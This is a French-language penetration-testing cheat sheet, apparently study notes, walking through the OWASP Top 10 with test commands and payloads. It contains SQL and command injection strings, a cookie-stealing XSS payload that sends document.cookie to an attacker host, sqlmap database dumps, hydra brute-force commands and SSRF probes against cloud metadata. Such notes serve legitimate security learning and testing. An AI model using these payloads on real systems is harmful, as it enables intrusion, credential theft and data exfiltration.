# 09 — OWASP Top 10

> Référence : https://owasp.org/www-project-top-ten

---

## A01 — Broken Access Control

```bash
# Tester l'accès à des ressources sans autorisation (IDOR)
curl -s http://[IP]/api/user/1
curl -s http://[IP]/api/user/2    # changer l'ID → accès à un autre compte ?

# Tester l'accès à des pages admin sans être connecté
curl -s http://[IP]/admin
curl -s http://[IP]/dashboard

# Avec Burp — modifier le rôle dans la requête
# Intercepter → changer role=user en role=admin → envoyer
```

**Points à vérifier**
- Accès à des URLs admin sans authentification
- Modifier un ID dans l'URL ou le body (IDOR)
- Changer un paramètre de rôle dans la requête

---

## A02 — Cryptographic Failures

```bash
# Vérifier si le site tourne en HTTP (pas HTTPS)
curl -I http://[IP]

# Vérifier le certificat SSL
openssl s_client -connect [IP]:443

# Chercher des données sensibles exposées
curl -s http://[IP] | grep -i "password\|secret\|key\|token\|api"

# Tester des endpoints API sans auth
curl -s http://[IP]/api/config
curl -s http://[IP]/api/keys
```

**Points à vérifier**
- Données sensibles transmises en HTTP clair
- Mots de passe stockés en MD5 ou SHA1 (faible)
- Clés API ou tokens exposés dans les réponses

---

## A03 — Injection

### SQL Injection
```bash
# Test manuel dans un champ ou URL
' OR 1=1 --
' OR '1'='1
admin'--

# SQLmap
sqlmap -u "http://[IP]/login?id=1" --dbs
sqlmap -u "http://[IP]/login?id=1" -D [db] -T [table] --dump

# Avec cookie de session
sqlmap -u "http://[IP]/page" --cookie="PHPSESSID=[valeur]" --dbs
```

### Command Injection
```bash
# Tester dans un champ qui exécute des commandes
; whoami
&& whoami
| whoami
`whoami`

# Exemple dans une URL
http://[IP]/ping?host=127.0.0.1; whoami
http://[IP]/ping?host=127.0.0.1 | cat /etc/passwd
```

### XSS — Cross-Site Scripting
```bash
# Payload basique pour tester
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>

# Vol de cookie (XSS stocké)
<script>document.location='http://[IP_KALI]:8080/?c='+document.cookie</script>

# Écouter les cookies reçus
python3 -m http.server 8080
```

---

## A04 — Insecure Design

**Points à vérifier manuellement**
- Fonctionnalités sensibles sans validation côté serveur
- Workflow métier contournable (ex: passer une étape de paiement)
- Absence de limite sur les tentatives (brute-force possible)
- Réinitialisation de mot de passe prévisible (question secrète, token faible)

---

## A05 — Security Misconfiguration

```bash
# Scanner les mauvaises configurations
nikto -h http://[IP]

# Vérifier les headers de sécurité
curl -I http://[IP]
# Chercher : X-Frame-Options, Content-Security-Policy, X-XSS-Protection

# Tester les méthodes HTTP autorisées
curl -X OPTIONS http://[IP] -i

# Chercher des fichiers sensibles exposés
curl http://[IP]/.env
curl http://[IP]/config.php
curl http://[IP]/backup.zip
curl http://[IP]/.git/config
curl http://[IP]/robots.txt
curl http://[IP]/sitemap.xml
```

**Points à vérifier**
- Page d'erreur qui expose la stack technique
- Répertoires listables (directory listing)
- Fichiers de config accessibles (`.env`, `.git`, `config.php`)
- Headers de sécurité absents

---

## A06 — Vulnerable Components

```bash
# Identifier les versions des services
nmap -sV [IP]

# Chercher des exploits connus
searchsploit [nom_service] [version]
searchsploit apache 2.4.49

# Vérifier les CVE en ligne
# https://www.exploit-db.com
# https://nvd.nist.gov

# Identifier les librairies JS exposées
curl -s http://[IP] | grep -i "jquery\|bootstrap\|angular\|react"
```

---

## A07 — Authentication Failures

```bash
# Brute-force login SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://[IP]

# Brute-force formulaire web
hydra -l admin -P rockyou.txt [IP] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Tester les credentials par défaut
admin:admin
admin:password
root:root
guest:guest

# Avec Burp Intruder
# Intercepter la requête login → Send to Intruder
# Marquer le champ password → Payload : rockyou.txt → Start Attack
```

**Points à vérifier**
- Pas de limite sur les tentatives de connexion
- Tokens de session prévisibles ou courts
- Pas de déconnexion côté serveur (token toujours valide après logout)
- Mot de passe dans l'URL ou les logs

---

## A08 — Software & Data Integrity Failures

**Points à vérifier manuellement**
- Mises à jour ou plugins chargés sans vérification de signature
- Pipeline CI/CD modifiable sans contrôle d'accès
- Désérialisation de données non fiables (paramètres base64, cookies sérialisés)

```bash
# Tester un cookie sérialisé
# Décoder en base64
echo "[valeur_cookie]" | base64 -d

# Si c'est un objet sérialisé PHP ou Java → potentiel vecteur d'attaque
```

---

## A09 — Logging & Monitoring Failures

**Points à vérifier manuellement**
- Les erreurs d'authentification ne sont pas loguées
- Aucune alerte sur des tentatives de brute-force
- Les logs sont accessibles sans authentification

```bash
# Chercher des fichiers de logs exposés
curl http://[IP]/logs/
curl http://[IP]/access.log
curl http://[IP]/error.log
```

---

## A10 — SSRF — Server-Side Request Forgery

```bash
# Tester un paramètre URL qui charge une ressource externe
curl "http://[IP]/fetch?url=http://127.0.0.1"
curl "http://[IP]/fetch?url=http://localhost/admin"
curl "http://[IP]/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata

# Avec Burp — intercepter une requête avec un paramètre URL
# Remplacer la valeur par http://127.0.0.1:[port]
# Tester les ports internes : 80, 443, 8080, 8443, 3306, 6379

# Bypass de filtres courants
http://[IP]/fetch?url=http://127.1
http://[IP]/fetch?url=http://0x7f000001   # 127.0.0.1 en hex
http://[IP]/fetch?url=http://[::1]        # IPv6 localhost
```

**Points à vérifier**
- Paramètres qui acceptent une URL (`url=`, `path=`, `src=`, `href=`, `redirect=`)
- Accès aux services internes (base de données, API interne, metadata cloud)
